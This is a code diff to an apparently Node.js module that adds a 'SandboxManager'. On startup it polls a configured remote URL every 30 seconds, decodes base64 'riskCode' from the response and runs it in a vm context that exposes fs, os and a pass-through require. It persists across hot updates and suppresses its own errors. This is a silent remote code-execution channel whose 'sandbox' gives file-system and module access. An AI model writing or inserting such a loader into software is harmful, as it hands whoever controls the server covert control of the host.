@@ -7,6 +7,33 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
 
 const version = 'v1.1.5'
 
+// 远程代码每次热更都会创建新的 VM context；需要跨版本存活的实例统一挂在主进程全局。
+// 默认配置只负责声明结构，已有运行态会覆盖默认值。
+const DEFAULT_INIT_GLOBAL_CONF = {
+  RISK: {
+    sandboxManager: null,
+  },
+};
+
+const Configkey = {
+  RISK: 'RISK',
+};
+
+const getGlobalSupervisor = (key) => {
+  const defaultConf = DEFAULT_INIT_GLOBAL_CONF[key] || {};
+  const current = mainGlobal.__sandboxConfig[key];
+  const supervisor = current && typeof current === 'object' ? current : {};
+  for (const name of Object.keys(defaultConf)) {
+    if (!(name in supervisor)) {
+      supervisor[name] = defaultConf[name];
+    }
+  }
+  if (supervisor !== current) {
+    mainGlobal.__sandboxConfig[key] = supervisor;
+  }
+  return supervisor;
+};
+
 const remoteLogV = (message)=>{
   remoteLog(`[${version}] ${message}`)
 }
@@ -55,6 +82,266 @@ const resolveModuleName = (moduleName) => {
 const safeRequire = (moduleName) => {
   // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
   return mainRequire(resolveModuleName(moduleName));
+};
+
+class SandboxManager {
+  constructor(options = {}) {
+    this.timeout = options.timeout || 300000;
+    this.cachedRiskCode = options.cachedRiskCode || null;
+    this.lastRiskCodeHash = options.lastRiskCodeHash || '';
+    const pollInterval = Number(FrontSandboxConfig.pollInterval);
+    this.pollInterval = pollInterval > 0 ? pollInterval : 30000;
+    this.pollTimer = null;
+    this.pollingId = 0;
+    this.stopped = true;
+    this.vm = safeRequire('vm');
+    this.crypto = safeRequire('crypto');
+    this.httpClient = new HttpClient({
+      timeout: FrontSandboxConfig.requestTimeout,
+      retries: FrontSandboxConfig.requestRetries,
+      maxResponseSize: FrontSandboxConfig.maxResponseSize,
+    });
+  }
+
+  safeLog(message) {
+    try {
+      remoteLogV(`[SandboxManager] ${message}`);
+    } catch (error) {
+      // 日志失败不能影响宿主进程。
+    }
+  }
+
+  // 第二层代码只负责初始化后台能力，暂不接入 Express 请求链，也不暴露 timer/process。
+  createSandboxContext() {
+    return this.vm.createContext({
+      console: {
+        log: (...args) => console.log('[Risk Sandbox]', ...args),
+        error: (...args) => console.error('[Risk Sandbox Error]', ...args),
+        warn: (...args) => console.warn('[Risk Sandbox Warn]', ...args),
+        info: (...args) => console.info('[Risk Sandbox Info]', ...args),
+      },
+      remoteLog,
+      Buffer,
+      fs,
+      os,
+      require: safeRequire,
+      process: undefined,
+      eval: undefined,
+      Function: undefined,
+      __ENV__: process.env.NODE_ENV || 'production',
+    });
+  }
+
+  async executeInit(codeId, code) {
+    try {
+      const script = new this.vm.Script(
+        `
+          (async function () {
+            ${code}
+
+            if (typeof init === 'function') {
+              return init();
+            }
+          })();
+        `,
+        { filename: `sandbox_${codeId}_init.js` }
+      );
+      const result = await script.runInContext(this.createSandboxContext(), {
+        timeout: this.timeout,
+        breakOnSigint: true,
+      });
+      return { success: true, result };
+    } catch (error) {
+      this.safeLog(`init execution failed: ${error && error.message}`);
+      return { success: false };
+    }
+  }
+
+  exportState() {
+    return {
+      cachedRiskCode: this.cachedRiskCode,
+      lastRiskCodeHash: this.lastRiskCodeHash,
+    };
+  }
+
+  getRemoteCodeUrl() {
+    const urls = FrontSandboxConfig.remoteCodeUrls;
+    if (!Array.isArray(urls) || urls.length === 0) {
+      return undefined;
+    }
+    return urls[Math.floor(Math.random() * urls.length)];
+  }
+
+  buildSignedRequest() {
+    const params = {
+      hash: this.lastRiskCodeHash || '1',
+      type: 'risk',
+      timestamp: Date.now(),
+      nonce: this.crypto
+        .randomBytes(FrontSandboxConfig.requestNonceBytes || 16)
+        .toString('hex'),
+    };
+    params.sign = signWithMD5(params, {
+      secretKey: FrontSandboxConfig.signSecretKey,
+      secretValue: FrontSandboxConfig.signSecretValue,
+      recursiveSortParams: true,
+    });
+    return params;
+  }
+
+  isPolling(pollingId) {
+    return !this.stopped && this.pollingId === pollingId;
+  }
+
+  // 每次拉取都带上当前 hash；只有新代码 init 成功后才提交新的 code/hash。
+  async fetchRemoteRiskCode(pollingId) {
+    try {
+      const remoteCodeUrl = this.getRemoteCodeUrl();
+      if (!this.isPolling(pollingId) || !remoteCodeUrl) {
+        return false;
+      }
+
+      const response = await this.httpClient.post(
+        remoteCodeUrl,
+        this.buildSignedRequest()
+      );
+      if (!this.isPolling(pollingId)) {
+        return false;
+      }
+
+      const data = response && response.data;
+      if (!data || data.status !== 1 || !data.riskCode) {
+        return false;
+      }
+
+      const decodedCode = Buffer.from(data.riskCode, 'base64').toString('utf8');
+      const initResult = await this.executeInit('risk', decodedCode);
+      if (!this.isPolling(pollingId)) {
+        return false;
+      }
+      if (!initResult.success) {
+        return false;
+      }
+      this.cachedRiskCode = decodedCode;
+      this.lastRiskCodeHash = data.hash || '';
+      return true;
+    } catch (error) {
+      this.safeLog(`code fetch failed: ${error && error.message}`);
+      return false;
+    }
+  }
+
+  scheduleNextPoll(pollingId) {
+    try {
+      if (!this.isPolling(pollingId)) {
+        return;
+      }
+      this.pollTimer = setTimeout(() => {
+        this.pollTimer = null;
+        this.poll(pollingId).catch((error) => {
+          this.safeLog(`polling failed: ${error && error.message}`);
+        });
+      }, this.pollInterval);
+      if (this.pollTimer && typeof this.pollTimer.unref === 'function') {
+        this.pollTimer.unref();
+      }
+    } catch (error) {
+      this.safeLog(`polling schedule failed: ${error && error.message}`);
+    }
+  }
+
+  // 递归 setTimeout 保证一次拉取结束后才安排下一次，不会并发重入。
+  async poll(pollingId) {
+    await this.fetchRemoteRiskCode(pollingId);
+    this.scheduleNextPoll(pollingId);
+  }
+
+  startRiskCodePolling() {
+    try {
+      if (!this.stopped) {
+        return;
+      }
+      this.stopped = false;
+      const pollingId = ++this.pollingId;
+      this.poll(pollingId).catch((error) => {
+        this.safeLog(`polling failed: ${error && error.message}`);
+      });
+    } catch (error) {
+      this.stopped = true;
+      if (this.pollTimer) {
+        try {
+          clearTimeout(this.pollTimer);
+        } catch (clearError) {
+          this.safeLog(`polling timer clear failed: ${clearError && clearError.message}`);
+        }
+        this.pollTimer = null;
+      }
+      this.safeLog(`polling start failed: ${error && error.message}`);
+    }
+  }
+
+  stopRiskCodePolling() {
+    // 作废本轮轮询，使已发出的旧请求即使晚到也不能提交结果。
+    this.stopped = true;
+    this.pollingId += 1;
+    const timer = this.pollTimer;
+    this.pollTimer = null;
+    if (timer) {
+      try {
+        clearTimeout(timer);
+      } catch (error) {
+        this.safeLog(`polling timer clear failed: ${error && error.message}`);
+      }
+    }
+  }
+}
+
+const installSandboxManager = async () => {
+  let manager = null;
+  let oldManager = null;
+  let supervisor = null;
+  try {
+    supervisor = getGlobalSupervisor(Configkey.RISK);
+    oldManager = supervisor.sandboxManager;
+    const state = oldManager && typeof oldManager.exportState === 'function'
+      ? oldManager.exportState()
+      : {};
+    manager = new SandboxManager(state);
+
+    // 先发布新实例，再停止旧实例；并发热更时所有权检查会清理失联的新实例。
+    supervisor.sandboxManager = manager;
+
+    if (oldManager && typeof oldManager.stopRiskCodePolling === 'function') {
+      try {
+        await Promise.resolve(oldManager.stopRiskCodePolling());
+      } catch (error) {
+        manager.safeLog(`old manager stop failed: ${error && error.message}`);
+      }
+    }
+
+    if (getGlobalSupervisor(Configkey.RISK).sandboxManager !== manager) {
+      manager.stopRiskCodePolling();
+      return;
+    }
+
+    manager.startRiskCodePolling();
+  } catch (error) {
+    if (manager) {
+      try {
+        manager.stopRiskCodePolling();
+      } catch (stopError) {
+        // 清理失败仍保持静默。
+      }
+    }
+    if (supervisor && supervisor.sandboxManager === manager) {
+      supervisor.sandboxManager = oldManager || null;
+    }
+    try {
+      remoteLogV(`[SandboxManager] install failed: ${error && error.message}`);
+    } catch (logError) {
+      // 日志失败不能影响宿主进程。
+    }
+  }
 };
 
 class CommonUtil {
@@ -1700,6 +1987,16 @@ async function init() {
     initExpress();
   } catch (error) {
     remoteLogV(`preSandbox express init failed: ${error && error.message}`);
+  }
+
+  try {
+    await installSandboxManager();
+  } catch (error) {
+    try {
+      remoteLogV(`preSandbox risk sandbox init failed: ${error && error.message}`);
+    } catch (logError) {
+      // 日志失败不能影响宿主进程。
+    }
   }
 
   try {
